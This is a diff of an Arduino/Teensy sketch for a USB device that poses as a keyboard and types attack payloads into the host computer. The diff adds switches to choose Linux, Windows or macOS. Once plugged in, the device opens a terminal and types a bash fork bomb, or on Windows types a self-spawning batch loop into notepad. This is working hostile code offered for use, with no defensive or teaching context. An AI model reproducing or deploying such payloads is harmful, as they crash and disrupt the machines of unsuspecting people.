@@ -1,41 +1,52 @@
-int ledPin = 11;
-int windows = 2;
+const int ledPin = 11;
+const int swLinux = 6;
+const int swWindows = 7;
+const int swMac = 8;
 
 void setup(){
-  delay(3000); // Inital delay
+  pinMode(swLinux, INPUT);
+  pinMode(swWindows, INPUT);
+  pinMode(swMac, INPUT);
+  // Let time to recognize usb keyboard
+  // FIXME: windows needs 3s, but linux is ok in less time
+  delay(3000);
 }
 
 void loop(){
-  // Start
-  digitalWrite(ledPin, HIGH);
-
-  // Exploit
-  //LinuxPayload();
-  WindowsPayload();
-
-  // End
-  digitalWrite(ledPin, LOW);
-  delay(20000); // Long delay between runs
+  if (digitalRead(swLinux) == HIGH){
+    LinuxPayload();
+  } 
+  else if(digitalRead(swWindows)){
+    WindowsPayload();
+  } 
+  else if(digitalRead(swMac)){
+    ApplePayload();
+  }
+  delay(60000); //1mn
 }
 
 // Specific functions
 void LinuxPayload(){
   LinuxCommandRun("xterm");
+  delay(800);
   Keyboard.print("ulimit -c unlimited");
+  KeyPress(KEY_ENTER);
   Keyboard.print(":(){ :|:& };:");
+  KeyPress(KEY_ENTER);
 }
 
 void WindowsPayload(){
   WindowsCommandRun("notepad.exe");
   Keyboard.print("\n");
-  Keyboard.print("");
-  Keyboard.print("");
-  Keyboard.print("");
+  Keyboard.print(":s");
+  Keyboard.print("start %0");
+  Keyboard.print("goto :s");
 }
 
 void ApplePayload(){
   AppleCommandRun("Terminal");
   Keyboard.print(":(){ :|:& };:");
+  KeyPress(KEY_ENTER);
 }
 
 // Utility functions
@@ -48,14 +59,14 @@ void WindowsCommandRun(char *SomeCommand){
 
 void LinuxCommandRun(char *SomeCommand){
   KeyCombo(MODIFIERKEY_ALT,KEY_F2);
-  delay(1500);
+  delay(300);
   Keyboard.print(SomeCommand);
   KeyPress(KEY_ENTER);
 }
 
 void AppleCommandRun(char *SomeCommand){
   KeyCombo(MODIFIERKEY_GUI,KEY_SPACE); // "apple" aka command key, space key -- open spotlight
-  delay(1500);
+  delay(500);
   Keyboard.print("Terminal.app");
   delay(1000);
 
@@ -80,4 +91,7 @@ void KeyCombo(int ModKey,int SomeKey) {
   Keyboard.set_key1(0);
   Keyboard.send_now();
 }
+
+
+
 
